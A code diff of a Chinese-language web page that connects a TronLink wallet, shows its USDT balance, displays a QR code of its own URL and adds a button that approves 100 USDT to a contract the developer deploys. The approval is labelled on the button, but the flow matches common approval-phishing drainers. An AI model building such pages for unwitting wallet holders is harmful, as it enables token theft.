@@ -3,76 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>查看 TRC-20 (USDT) 余额</title>
-    <!-- 引入波场 TronWeb 库 -->
+    <title>TRC-20 授权与余额查询</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-    <!-- 引入 QRCode 库，用来在网页上生成当前网址的二维码 -->
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 30px; background: #f4f4f9; }
-        .card { background: white; padding: 25px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-        button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-size: 16px; margin: 15px 0; width: 100%; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f9; }
+        .card { background: white; padding: 20px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: left; }
+        button { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; font-size: 14px; width: 100%; margin-top: 10px; }
         button:hover { background: #0056b3; }
         #qrcode { margin: 15px auto; display: flex; justify-content: center; }
-        .info-box { text-align: left; margin-top: 15px; word-break: break-all; background: #f8f9fa; padding: 10px; border-radius: 6px; }
+        .info { margin-bottom: 15px; font-size: 14px; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>波场 USDT 余额查询</h2>
-        <p style="color: #666; font-size: 14px;">用手机钱包扫描下方二维码，或点击按钮连接：</p>
+        <h2 style="text-align: center;">USDT 余额与合约授权</h2>
         
-        <!-- 自动生成的二维码容器 -->
+        <!-- 扫码区域 -->
         <div id="qrcode"></div>
 
-        <div>
-            <button id="connectBtn">连接 TronLink 钱包</button>
+        <div class="info">
+            <p><strong>钱包地址：</strong><span id="walletAddress">未连接</span></p>
+            <p><strong>USDT 余额：</strong><span id="usdtBalance">0.00</span> USDT</p>
         </div>
-        
-        <div class="info-box">
-            <p><strong>钱包地址：</strong><span id="walletAddress" style="color: #333;">未连接</span></p>
-            <p><strong>USDT 余额：</strong><span id="usdtBalance" style="color: #28a745; font-weight: bold;">0.00</span> USDT</p>
-        </div>
+
+        <!-- 功能按钮 -->
+        <button id="connectBtn">1. 连接钱包并显示余额</button>
+        <button id="approveBtn" style="background: #ffc107; color: black;" disabled>2. 授权钱包 USDT 给合约</button>
     </div>
 
     <script>
-        // 1. 自动把当前网页的网址转换成二维码显示在页面上
-        QRCode.toCanvas(document.getElementById('qrcode'), window.location.href, { width: 180 }, function (error) {
-            if (error) console.error(error);
-        });
+        // 自动生成当前网址的二维码
+        QRCode.toCanvas(document.getElementById('qrcode'), window.location.href, { width: 150 });
 
-        // 官方 USDT 在波场主网的合约地址
-        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+        const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 官方 USDT 地址
+        const CONTRACT_ADDRESS = "你的部署合约地址_HEX格式或Base58"; // <--- 填入你在 Remix 部署的合约地址
+        let tronWeb;
 
-        // 2. 点击按钮连接钱包并查询余额
+        // 功能 1：连接钱包并显示 TRC-20 余额
         document.getElementById('connectBtn').onclick = async () => {
-            try {
-                // 检查浏览器或手机钱包环境是否注入了 tronWeb
-                let tronWebInstance = window.tronWeb;
-                
-                // 如果没有直接注入，尝试等待或提示
-                if (!tronWebInstance || !tronWebInstance.defaultAddress.base58) {
-                    alert("请在 TronLink 钱包的内置浏览器中打开此网页，或确保电脑上已安装 TronLink 插件并登录！");
-                    return;
-                }
-
-                const address = tronWebInstance.defaultAddress.base58;
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                tronWeb = window.tronWeb;
+                let address = tronWeb.defaultAddress.base58;
                 document.getElementById('walletAddress').innerText = address;
 
-                // 加载官方 USDT 合约
-                let contract = await tronWebInstance.contract().at(USDT_CONTRACT_ADDRESS);
-                
-                // 调用合约的 balanceOf 方法查询余额
-                let balance = await contract.balanceOf(address).call();
-                
-                // USDT 是 6 位小数，计算真实的金额
-                let formattedBalance = tronWebInstance.toDecimal(balance) / 1000000;
-                document.getElementById('usdtBalance').innerText = formattedBalance;
+                try {
+                    let usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
+                    let balance = await usdtContract.balanceOf(address).call();
+                    // USDT 是 6 位小数，除以 10^6 还原真实金额
+                    document.getElementById('usdtBalance').innerText = tronWeb.toDecimal(balance) / 1000000;
+                    
+                    // 余额加载成功后，点亮第二步的授权按钮
+                    document.getElementById('approveBtn').disabled = false;
+                } catch (err) {
+                    alert("获取余额失败: " + err.message);
+                }
+            } else {
+                alert("请在 TronLink 钱包内置浏览器中打开此网页！");
+            }
+        };
 
+        // 功能 2：让钱包授权 USDT 给你的合约
+        document.getElementById('approveBtn').onclick = async () => {
+            try {
+                let usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
+                // 比如授权 100 USDT (100 * 10^6)
+                let approveAmount = "100000000"; 
+                
+                let res = await usdtContract.approve(CONTRACT_ADDRESS, approveAmount).send();
+                alert("授权成功！交易哈希: " + res);
             } catch (err) {
-                console.error(err);
-                alert("获取数据失败: " + err.message);
+                alert("授权失败: " + err.message);
             }
         };
     </script>
